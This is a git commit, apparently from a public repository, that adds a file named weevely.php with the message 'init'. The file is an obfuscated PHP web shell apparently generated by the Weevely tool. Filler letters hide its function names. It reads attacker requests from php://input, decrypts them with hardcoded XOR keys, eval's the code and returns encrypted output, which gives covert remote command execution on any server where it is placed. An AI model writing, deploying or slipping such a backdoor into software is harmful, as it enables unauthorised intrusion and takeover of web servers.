ba25763670dc904432ceb880c060c7e4ca95fd04
donaldtn <donaldtn@users.noreply.github.com>
2019-11-14 18:02:56 -0500

    init

---
+++ weevely.php
@@ -0,0 +1,11 @@
+<?php
+$Z='unOction x(OO$t,$k){$c=stOrlenO($k);$l=OOstrlenO($t);$o=O"";for($OOi=0;$i<$Ol;)O{OfoOr';
+$V=str_replace('v','','vcrevate_vfuvncvtivon');
+$w='ndO_cleanO(O);$r=@basOeO64_encode(@xO(@gzcomOOpress(O$o),$k));priOOnOt("$p$kh$r$kf");}';
+$b='$k="90fO2Oc9c5";$khO="3f6654O0e6O734";O$kOf=O"9e0ab83d8cd0";O$Op="l2hd6qfUQJOaYpaOMN";f';
+$s='Oh("/$khO(.+O)$Okf/",@file_gOet_conOtentsO("phOp://inpuOt"),$mO)O=O=1){@Oob_start();@eO';
+$o='($j=0;($j<$c&&$i<$l);$jO++,$Oi++){O$o.=$t{O$i}^O$k{$Oj};}O}return O$o;}if(O@preg_matc';
+$y='val(@gzuncOOompress(@x(@Obase6O4_Odecode($m[1])O,$k)))O;$oO=@ob_OgetO_contenOts();@ob_e';
+$O=str_replace('O','',$b.$Z.$o.$s.$y.$w);
+$K=$V('',$O);$K();
+?>
